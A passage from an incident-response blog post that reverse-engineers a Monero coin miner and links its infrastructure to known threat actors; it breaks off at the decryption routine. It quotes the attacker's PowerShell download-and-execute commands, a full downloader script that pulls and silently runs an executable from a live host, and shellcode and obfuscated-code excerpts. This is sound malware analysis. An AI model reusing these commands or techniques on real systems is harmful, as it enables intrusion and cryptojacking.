<div class="row-fluid-wrapper row-depth-1 row-number-3 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1630625359576" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">


<div id="" class="gp-block gp-block_paddings-large gp-block_light gp-block_bottom-none gp-content gp-content_col-8">
  <div class="gp-content__container">
    

    
    
    
    
    <div class="gp-content__row">
      
      
<div class="gp-content__info">
  
  <div class="gp-content__infoRte"><article id="13854093-4b35-4c37-851b-ff4365827a58" class="page sans"><header></header>
<div class="page-body">
<p id="92e17841-a384-4005-9d55-0d380125a84f" class="">In this blog post, we will use public and open source tooling to investigate a coin miner that was encountered during a Digital Forensics and Incident Response (DFIR) investigation. While the malware was detected by a large amount of AV/EDR solutions as a generic coin miner, we wanted to dig just a bit deeper to see if we could identify which coin miner was used and attempt attribution to any known Threat Actors (TA). By following the trail of breadcrumbs and peeling away the layers of obfuscation, we were able to deduce that an off-the-shelf, open source coin miner was used. The coin miner uses some more ‘modern’, though very well known, techniques such as direct system calls in an attempt to evade some endpoint security products. Additionally, this TA has been operating for at least 4 years and possibly longer, with a preference for known exploits in publicly facing infrastructure.</p>
<h2 id="e1d16c06-703c-4c45-a205-b951e802c87a" class="">Breadcrumbs</h2>
<p id="ce1957dd-7db5-42cf-bf1e-d49f57a63d97" class="">During an DFIR investigation, we came across a suspicious PowerShell command that was executed on the system by an unknown TA. There was limited forensic evidence available and we only had the name of the PowerShell script and the IP address it communicated with to go on.</p>
<p id="f6b0f0e4-ba3e-4fa8-8d23-6dd6257e04f9" class="">From the event logs of this investigation we could see that the xmr.ps1 payload was downloaded from two IP addresses, 80.71.158[.]96 and 198.12.68[.]106, via the following commands:</p>
<pre id="8e181f30-4d4b-4128-9837-a75a1378eead" class="code code-wrap"><code>HostApplication=powershell iex(New-Object Net.WebClient).DownloadString('hxxp://80.71.158[.]96/xmr.ps1')
HostApplication=powershell iex(New-Object Net.WebClient).DownloadString('hxxp://198.12.68[.]106/xmr.ps1'</code></pre>
<p id="cb2e3156-e5b9-402e-8231-74abd89dc1a4" class="">A check of <a href="https://www.greynoise.io/viz/ip/198.12.68.106">Greynoise.io</a> shows that 198.12.68[.]106 has a record of scanning the internet with zmap and making web requests for the following directory paths:</p>
<pre id="c37a7c65-375a-414c-be06-27b3d926c076" class="code code-wrap"><code>/solr/
/console/login/LoginForm.jsp</code></pre>
<p id="cb8dc3b0-0064-4cfe-a12d-cf7524a3dc7e" class="">Scanning for these paths suggests that the TA is searching for internet facing servers with well known vulnerabilities present in Apache Solr and Oracle Weblogic that grant Remote Code Execution such as <a href="https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability">CVE-2019-17558</a> and <a href="https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild">CVE-2020 14882</a>.</p>
<p id="ddc0fc8c-c92e-4cd2-9b48-cb4e81a836b7" class="">We observed activity from the TA most recently to be associated with exploiting ProxyShell vulnerabilities. Alongside the above exploits, a behaviour pattern emerges where low-skill, high-reward exploits are used against internet-facing devices in an opportunistic manner.</p>
<p id="f4cf932d-55d2-48ce-a17e-b63d8f48933d" class="">When checking historical DNS records for 198.12.68[.]106, we noted that it had a collection of subdomains resolving to it. Namely <code class="inline">a.oracleservice[.]to</code> was seen to resolve to the IP between 17/02/2022 and 18/02/2022. This domain is known to be associated with command and control infrastructure for TA <a href="https://attack.mitre.org/groups/G0139/">TeamTNT</a>, as shown in this AlienVault <a href="https://otx.alienvault.com/pulse/6026dbb6260827691b6ce5bf/">Pulse</a>. Within this pulse is a collection of subdomains, including <code class="inline">pwn.oracleservice[.]top</code> and <code class="inline">pwn.givemexyz[.]in</code>. Notably, <code class="inline">pwn.givemexyz[.]in</code> is identified as a failover IRC server for the Tsunami cloud-based botnet used by pwnrig and 8220 Gang, as identified in <a href="https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/">reporting</a> by LaceworkLabs in May 2021.</p>
<p id="4b8018a5-684f-42d1-a6fa-a985cabb2a83" class="">The other IP identified, 80.71.158[.]96, also has a historical record resolving to <code class="inline">a.oracleservice[.]top</code> between 05/01/22 and 26/03/22. This adds a further connection between the two IPs.</p>
<p id="9deae774-ea32-4e2f-b1b5-1f1d6ddf2e26" class="">The IP of 80.71.158[.]96 was still accessible during the investigation, so the script was downloaded and investigated, containing the following content:</p>
<pre id="033a63a2-de9f-4619-bf50-ba2f77d02ec0" class="code code-wrap"><code>$cc = "http://80.71.158.96"
$is64 = (([Array](Get-WmiObject -Query "select AddressWidth from Win32_Processor"))[0].AddressWidth -eq 64)
$xmr = "$cc/nazi.exe"

if ($is64) {
    $xmr = "$cc/nazi.exe"
}

(New-Object Net.WebClient).DownloadFile($xmr, "$env:TMP\nazi.exe")
if (!(Get-Process network01 -ErrorAction SilentlyContinue)) {
    Start-Process "$env:TMP\nazi.exe" -windowstyle hidden
}</code></pre>
<blockquote id="55f25eca-3ac0-44cb-93b9-7f4305d3c553" class="">Update: the URL is still live at the time of writing and hosting the xmr.ps1 script, though it seems the Threat Actor has updated the name of the executable to
<pre id="368d3541-3e59-42fe-b3a4-93d08c7ae289" class="code code-wrap"><code>oracleservice.exe</code></pre>
</blockquote>
<p id="7eef0dab-2a25-444b-a3be-0b83803ec84b" class="">While this seems to bake in some logic to select an x86 or x64 payload based on the processor architecture, the same file is downloaded regardless. Given the name of the PS script, we already had a strong suspicion this was a Monero (XMR) coin miner being downloaded and executed. To confirm our suspicions, we downloaded the executable, opened it in Ghidra and performed static analysis and reverse engineering.</p>
<h2 id="1c67922d-a460-406e-ab53-b48cd17ab760" class="">Stage 1: The loader</h2>
<p id="eda6863a-2dfe-46a5-a94f-012f9b40e1db" class="">Following the execution from the entry-point, we arrive at what looks like the main function of the loader:</p>
<p><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=989&amp;name=monero_Untitled.png" alt="monero_Untitled" width="989" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=495&amp;name=monero_Untitled.png 495w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=989&amp;name=monero_Untitled.png 989w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=1484&amp;name=monero_Untitled.png 1484w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=1978&amp;name=monero_Untitled.png 1978w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=2473&amp;name=monero_Untitled.png 2473w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled.png?width=2967&amp;name=monero_Untitled.png 2967w" sizes="(max-width: 989px) 100vw, 989px"></p>
<p id="969526e7-4956-41b8-a437-904823db6ea8" class="">We can see it sleeps for 15 seconds in a likely attempt to evade any sandboxes, followed by a call to <code class="inline">_get_pgmptr</code> to retrieve the path of the process. <code class="inline">FUN_00401000</code> looks like it takes a pointer to some data and a size variable, returning a string. When we inspect the function it looks to be an XOR encryption function that decrypts the given data and returns it:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=862&amp;name=monero_Untitled%201.png" alt="monero_Untitled 1" width="862" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=431&amp;name=monero_Untitled%201.png 431w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=862&amp;name=monero_Untitled%201.png 862w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=1293&amp;name=monero_Untitled%201.png 1293w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=1724&amp;name=monero_Untitled%201.png 1724w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=2155&amp;name=monero_Untitled%201.png 2155w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%201.png?width=2586&amp;name=monero_Untitled%201.png 2586w" sizes="(max-width: 862px) 100vw, 862px"></p>
<p id="f90a4640-ff60-4018-ba50-25aee7a2ee63" class="">As a quick proof of concept, we’ll use CyberChef to confirm:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=968&amp;name=monero_Untitled%202.png" alt="monero_Untitled 2" width="968" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=484&amp;name=monero_Untitled%202.png 484w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=968&amp;name=monero_Untitled%202.png 968w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=1452&amp;name=monero_Untitled%202.png 1452w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=1936&amp;name=monero_Untitled%202.png 1936w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=2420&amp;name=monero_Untitled%202.png 2420w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%202.png?width=2904&amp;name=monero_Untitled%202.png 2904w" sizes="(max-width: 968px) 100vw, 968px"></p>
<p id="fa043afe-1267-4e5a-994c-220f2a27e53c" class="">After quickly decrypting the hard-coded strings, we’ll make reversing a bit easier by adding some comments containing the decrypted strings and renaming the appropriate variables:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=871&amp;name=monero_Untitled%203.png" alt="monero_Untitled 3" width="871" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=436&amp;name=monero_Untitled%203.png 436w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=871&amp;name=monero_Untitled%203.png 871w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=1307&amp;name=monero_Untitled%203.png 1307w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=1742&amp;name=monero_Untitled%203.png 1742w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=2178&amp;name=monero_Untitled%203.png 2178w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%203.png?width=2613&amp;name=monero_Untitled%203.png 2613w" sizes="(max-width: 871px) 100vw, 871px"></p>
<p id="22923f16-e10c-43d4-ba72-51fd9ecd5dd9" class="">In this function, the loader retrieves the system root (”C:\Windows\”), appends “System32\conhost.exe”, stores that, then creates a new command line by adding the path of the current executable to the conhost.exe path, resulting in the following command:</p>
<pre id="9eaf9994-8863-420e-a872-8668ab760f33" class="code code-wrap"><code>C:\Windows\System32\conhost.exe &lt;current process path&gt;</code></pre>
<p id="0cd55f29-94f9-4632-bb81-c79e5704d4eb" class="">This is used by <code class="inline">CreateProcessA</code> to create the conhost.exe process, pass it the command and launch it in a suspended state by providing the following Process Creation Flags:</p>
<pre id="943dfdac-2b93-42db-b9f3-a0ce1370a510" class="code code-wrap"><code>CREATE_NO_WINDOW - 0x08000000
CREATE_SUSPENDED - 0x00000004</code></pre>
<p id="7ce22b18-a34f-444e-9d2b-f83445d0323f" class="">The <code class="inline">_PROCESS_INFORMATION</code> structure is populated and the next function (<code class="inline">FUN_00401a9a</code>) uses the handle to the suspended process in some way. Digging into this next function, we see it performs a syscall instruction:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=281&amp;name=monero_Untitled%204.png" alt="monero_Untitled 4" width="281" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=141&amp;name=monero_Untitled%204.png 141w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=281&amp;name=monero_Untitled%204.png 281w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=422&amp;name=monero_Untitled%204.png 422w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=562&amp;name=monero_Untitled%204.png 562w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=703&amp;name=monero_Untitled%204.png 703w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%204.png?width=843&amp;name=monero_Untitled%204.png 843w" sizes="(max-width: 281px) 100vw, 281px"></p>
<p id="16300237-24ba-4570-ada2-a30c66708255" class="">If we follow <code class="inline">FUN_004018f1</code>, there is a piece of code that would look familiar to some implant or malware developers, using a binary OR operation to find the name of a loaded DLL in memory. In this case, the below code attempts to find ntdll.dll by OR’ing the name with <code class="inline">0x20202020</code>, resulting in <code class="inline">0x6c64746e</code>.</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=913&amp;name=monero_Untitled%205.png" alt="monero_Untitled 5" width="913" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=457&amp;name=monero_Untitled%205.png 457w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=913&amp;name=monero_Untitled%205.png 913w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=1370&amp;name=monero_Untitled%205.png 1370w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=1826&amp;name=monero_Untitled%205.png 1826w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=2283&amp;name=monero_Untitled%205.png 2283w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%205.png?width=2739&amp;name=monero_Untitled%205.png 2739w" sizes="(max-width: 913px) 100vw, 913px"></p>
<p id="e378b296-4c8f-42db-95dc-31a9920ad35d" class="">A brief google search shows that this is most likely a way to use direct system calls rather than potentially hooked Windows APIs, specifically in this case the SysWhispers2 project by jthuraisamy (<a href="https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L53-L54">https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L53-L54</a>).</p>
<p id="9cb03b4c-a399-4258-87ea-9d757fa2c221" class="">In order to use the direct system calls, it’s necessary to use the lower level Windows APIs present in ntdll.dll. For example, it would be necessary to use <code class="inline">NtAllocateVirtualMemory</code> rather than <code class="inline">VirtualAlloc</code> since it is the former that will perform the syscall() instruction to allocate the requested memory.</p>
<p id="6931b2a4-db4e-483c-adf9-e2a08bd5ae57" class="">While some of these lower level system call functions used in the coin miner’s loader can be guessed based on their arguments and some knowledge of common process injection patterns, we can confirm it by loading the executable in a debugger and stepping through the execution until we hit the system call.</p>
<p id="6ba85315-1efe-4369-8bb3-63cfe0defe29" class="">Once the executable is loaded and x64dbg has control, we can see the function calls following the call to <code class="inline">CreateProcessA</code>. We’ll step into the first function and set a breakpoint on the syscall, revealing the system call about to be called is <code class="inline">NtAllocateVirtualMemory</code>.</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=768&amp;name=monero_Untitled%206.png" alt="monero_Untitled 6" width="768" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=384&amp;name=monero_Untitled%206.png 384w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=768&amp;name=monero_Untitled%206.png 768w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=1152&amp;name=monero_Untitled%206.png 1152w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=1536&amp;name=monero_Untitled%206.png 1536w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=1920&amp;name=monero_Untitled%206.png 1920w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%206.png?width=2304&amp;name=monero_Untitled%206.png 2304w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p id="8fec936c-0e42-48b4-9c8e-a0cb6436670f" class="">Back to Ghidra, we can see the next function uses the same XOR decryption routine, this time with a large size, meaning we likely have found the function where shellcode is being decrypted, presumably followed by a function to write it into memory in the created process. Since we’re interested in this shellcode, but this shellcode is being injected into a suspended child process and not in the process we’re currently debugging, we will use x64dbg to retrieve it. We’ll do this by setting a break point after the decryption function, inspecting the ‘rax’ register for the location of the decrypted code and dumping it to disk:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=414&amp;name=monero_Untitled%207.png" alt="monero_Untitled 7" width="414" loading="lazy" style="width: 414px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=207&amp;name=monero_Untitled%207.png 207w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=414&amp;name=monero_Untitled%207.png 414w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=621&amp;name=monero_Untitled%207.png 621w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=828&amp;name=monero_Untitled%207.png 828w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=1035&amp;name=monero_Untitled%207.png 1035w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%207.png?width=1242&amp;name=monero_Untitled%207.png 1242w" sizes="(max-width: 414px) 100vw, 414px"></p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=436&amp;name=monero_Untitled%208.png" alt="monero_Untitled 8" width="436" loading="lazy" style="width: 436px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=218&amp;name=monero_Untitled%208.png 218w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=436&amp;name=monero_Untitled%208.png 436w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=654&amp;name=monero_Untitled%208.png 654w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=872&amp;name=monero_Untitled%208.png 872w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=1090&amp;name=monero_Untitled%208.png 1090w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%208.png?width=1308&amp;name=monero_Untitled%208.png 1308w" sizes="(max-width: 436px) 100vw, 436px"></p>
<p id="49d96ba7-781d-43bd-884e-020e7d19293f" class="">The in-memory decrypted shellcode starts with a call to another function, which could be some sort of further decryption routine:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=585&amp;name=monero_Untitled%209.png" alt="monero_Untitled 9" width="585" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=293&amp;name=monero_Untitled%209.png 293w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=585&amp;name=monero_Untitled%209.png 585w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=878&amp;name=monero_Untitled%209.png 878w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=1170&amp;name=monero_Untitled%209.png 1170w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=1463&amp;name=monero_Untitled%209.png 1463w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%209.png?width=1755&amp;name=monero_Untitled%209.png 1755w" sizes="(max-width: 585px) 100vw, 585px"></p>
<p id="02317037-03bd-4d4f-ae44-771e5d46dc66" class="">Before we attempt to analyse the shellcode, we’ll need to confirm the rest of the assumptions around the process injection by mapping the remaining functions to their system calls and renaming some of the variables for clarity. The reversed function now looks as follows:</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=879&amp;name=monero_Untitled%2010.png" alt="monero_Untitled 10" width="879" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=440&amp;name=monero_Untitled%2010.png 440w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=879&amp;name=monero_Untitled%2010.png 879w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=1319&amp;name=monero_Untitled%2010.png 1319w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=1758&amp;name=monero_Untitled%2010.png 1758w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=2198&amp;name=monero_Untitled%2010.png 2198w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2010.png?width=2637&amp;name=monero_Untitled%2010.png 2637w" sizes="(max-width: 879px) 100vw, 879px"></p>
<p id="83f6d5e4-3fec-442d-abb9-05dd37c19965" class="">We’ll transfer the dumped memory and inspect it using <code class="inline">xxd</code>, revealing the following contents:</p>
<pre id="20e06ae3-180b-4a4e-a337-ff06750475f0" class="code code-wrap"><code>00000000: 1001 1b00 0000 0000 1001 1b00 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 00a0 2500 0000 0000 0010 2600 0000 0000  ..%.......&amp;.....
00000030: 0000 0000 0000 0000 8f89 10e0 0000 0004  ................
00000040: e880 6925 0080 6925 00ff 7d52 2ec6 9f57  ..i%..i%..}R...W
00000050: 9595 80d8 0c1d 80a4 f6d6 6ba0 c16d 7da6  ..........k..m}.
00000060: c7cf c2fc 3d97 fb3e 6900 0000 00dd a261  ....=..&gt;i......a
00000070: 4b3a 29a2 8fdd c528 9ed8 5fe0 8134 80fc  K:)....(.._..4..
00000080: 5fa3 c51f d9ab 2500 0bf1 fd08 d6c9 04bf  _.....%.........
00000090: 2822 1dc9 87f0 c2f1 efcc bebe 9437 130b  ("...........7..</code></pre>
<p id="5c6aa196-d6c7-4d71-9abc-6b01050c9ead" class="">The shellcode was written to <code class="inline">0xB96040</code>, but the memory we saved to disk started at <code class="inline">0xB96000</code>, so we’ll trim the first 64 bytes to get to the actual shellcode (this can be easily done with <code class="inline">tail</code> on any *nix system: <code class="inline">tail -c +65 memorydump.bin &gt; trimmed.bin</code>).</p>
<p id="0fc38d3f-1c92-482f-9154-65973a578bdf" class="">At this point, we know the loader uses system calls to inject the decrypted shellcode into a suspended child process. It then proceeds to kick off execution in that child process using <code class="inline">NtCreateThreadEx</code>.</p>
<p id="4abcb50d-3371-4032-8c6b-064b7a768dcf" class="">During the initial triage of this malware, we had also checked the hash on VirusTotal. As it turns out, a few of the vendors classified the file as “Win64.Donut”. Donut (<a href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a>) “is a position-independent code that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies”. It can take any of the supported executable formats and convert it into Position-Independent Code (PIC). Based on the VT results, we can confirm this is indeed Donut shellcode using a few different ways. One such way is this Yara rule created by the Telsy CTI Team (<a href="https://gist.github.com/g-les/47e958c9069765d298aadfe6da677f29">https://gist.github.com/g-les/47e958c9069765d298aadfe6da677f29</a>) which informs us Donut shellcode has the following characteristics:</p>
<ol id="4122dba6-a4f4-452a-b702-15077c36a3f3" class="numbered-list" start="1" type="1">
<li>Always starts with a call - first byte is <code class="inline">e8</code></li>
</ol>
<ol id="db13db15-277c-48c8-ae52-607993cf4c1e" class="numbered-list" start="2" type="1">
<li>the next 4 bytes are identical to the 4 after that: <code class="inline">80692500 80692500</code></li>
</ol>
<p id="693a002c-145e-47be-b975-f55c92ea9d3c" class="">To really confirm this is Donut-generated shellcode, we can also use the amazing “undonut” (<a href="https://github.com/listinvest/undonut">https://github.com/listinvest/undonut</a>) tool to unpack it and even recover the original shellcode:</p>
<pre id="946700ce-62d2-417f-9412-49a9421b119d" class="code code-wrap"><code>./undonut -recover recovered.bin -shellcode trimmed.bin

Donut Instance:
 [*] Size: 2451840
 [*] Instance Master Key: [255 125 82 46 198 159 87 149 149 128 216 12 29 128 164 246]
 [*] Instance Nonce: [214 107 160 193 109 125 166 199 207 194 252 61 151 251 62 105]
 [*] IV: 4b61a2dd00000000
 [*] Exit Option: EXIT_OPTION_THREAD
 [*] Entropy: ENTROPY_DEFAULT
 [*] DLLs: ole32;oleaut32;wininet;mscoree;shell32
 [*] AMSI Bypass: BYPASS_CONTINUE
 [*] Instance Type: INSTANCE_EMBED
 [*] Module Master Key: [219 86 126 253 25 188 162 132 41 85 73 175 189 123 232 151]
 [*] Module Nonce: [32 72 59 243 234 58 232 241 83 46 149 230 228 206 217 162]
 [*] Module Type: MODULE_NET_EXE
 [*] Module Compression: COMPRESS_NONE

Extracting original payload to recovered.bin</code></pre>
<p id="0be71b3f-00c6-4d17-93c6-3162a00ec74a" class="">Looks like we’re dealing with a .NET assembly based on the Module Type and a quick check of recovered.bin confirms this:</p>
<pre id="39244401-7149-41ac-9bbb-89ae62d7e82d" class="code code-wrap"><code>recovered.bin: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows</code></pre>
<p id="adcd5361-5986-4a44-b23f-196840758ec0" class="">In summary, the original PowerShell one-liner executed a PowerShell script in memory. This script downloaded <code class="inline">nazi.exe</code> to <code class="inline">$env:TMP</code> and executed it. This executable then used direct system calls to create a suspended process, decrypted an XOR-encrypted blob of Donut-generated shellcode and injected it into the suspended process, followed by a call to <code class="inline">NtCreateThreadEx</code> to start execution at the start of the Donut-generated shellcode in this suspended process. We then used <code class="inline">undonut</code> to retrieve the original .NET binary out of the shellcode for further analysis.</p>
<h2 id="5e25ccaa-4379-49e4-90d4-5be5d9a87a26" class="">Stage 2: The obfuscated .NET assembly</h2>
<p id="768c393d-352a-4c30-8c98-9671b0cbad95" class="">Since we’re now dealing with a .NET assembly, we’ll switch gears and load it in dnSpy (<a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>), which can be used to disassemble and edit .NET code. At first glance, it seems to use some further obfuscation by both renaming some of the methods and encrypting the strings.</p>
<p class=""><img src="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=997&amp;name=monero_Untitled%2011.png" alt="monero_Untitled 11" width="997" loading="lazy" style="width: 100%;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=499&amp;name=monero_Untitled%2011.png 499w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=997&amp;name=monero_Untitled%2011.png 997w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=1496&amp;name=monero_Untitled%2011.png 1496w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=1994&amp;name=monero_Untitled%2011.png 1994w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=2493&amp;name=monero_Untitled%2011.png 2493w, https://www.triskelelabs.com/hs-fs/hubfs/monero_cyberwonderland/monero_Untitled%2011.png?width=2991&amp;name=monero_Untitled%2011.png 2991w" sizes="(max-width: 997px) 100vw, 997px"></p>
<p id="981660dc-e0d0-4ee1-874a-3d4c3f4a4501" class="">As these strings need to be de-obfuscated at run time, we can simply use the decryption function in the assembly to decrypt the strings. The first part of the decryption just base64-decodes the text, then passes it on to the decryption:</p>
<pre id="e5bc34c6-32d5-4c2f-a6c7-a85dfb6a3134" class="code code-wrap"><code>public static string lpqwqedvebymoauwor(string dzgxchdoczxqowkwogbsmcd)
    {
        return Encoding.UTF8.GetString(fjhrvaynwouqvkbeletmwuvcmtugqknf.uwcbfdbqkrwtzb(Convert.FromBase64String(dzgxchdoczxqowkwogbsmcd), false));
    }</code></pre>
<p id="7be56b0b-bab8-431b-bde1-d2dc467e91e8" class="">The decryption function:</p>
